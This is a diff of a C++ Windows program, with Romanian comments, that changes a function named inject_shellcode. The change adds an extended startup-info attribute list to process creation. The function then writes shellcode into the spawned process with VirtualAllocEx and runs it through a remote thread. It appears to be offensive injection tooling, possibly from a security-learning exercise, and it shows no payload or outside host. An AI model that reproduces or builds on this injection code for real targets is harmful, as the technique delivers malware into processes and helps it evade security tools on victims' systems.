@@ -27,12 +27,21 @@ BYTE* get_file_bytes(const wchar_t* filePath, DWORD &outputBytesRead) {
 }
 
 void inject_shellcode(wchar_t cmd[], std::vector<BYTE> shellcode) {
-    LPSTARTUPINFOW       si;
+    LPSTARTUPINFOEXW si = new STARTUPINFOEXW();
     PPROCESS_INFORMATION pi;
     BOOL                 success;
 
-    si = new STARTUPINFOW();
-    si->cb = sizeof(LPSTARTUPINFOW);
+    si->StartupInfo.cb = sizeof(STARTUPINFOEXW);
+
+    SIZE_T lpSize = 0;
+
+    const DWORD attributeCount = 1;
+
+    InitializeProcThreadAttributeList(
+        NULL,
+        attributeCount,
+        0,
+        &lpSize);
 
     pi = new PROCESS_INFORMATION();
 
@@ -43,10 +52,10 @@ void inject_shellcode(wchar_t cmd[], std::vector<BYTE> shellcode) {
         NULL,
         NULL,
         FALSE,
-        0,
+        EXTENDED_STARTUPINFO_PRESENT,
         NULL,
         NULL,
-        si,
+        &si->StartupInfo, // folosim optiunile din lista updatata
         pi);
 
     LPVOID ptr = VirtualAllocEx(
@@ -79,10 +88,6 @@ void inject_shellcode(wchar_t cmd[], std::vector<BYTE> shellcode) {
         0, // flagul de executie; 0 - este executat imediat
         &threadId // parametru de output - ID-ul thread-ului
     );
-
-    CloseHandle(hThread);
-    CloseHandle(pi->hThread);
-    CloseHandle(pi->hProcess);
 }
 
 int main() {
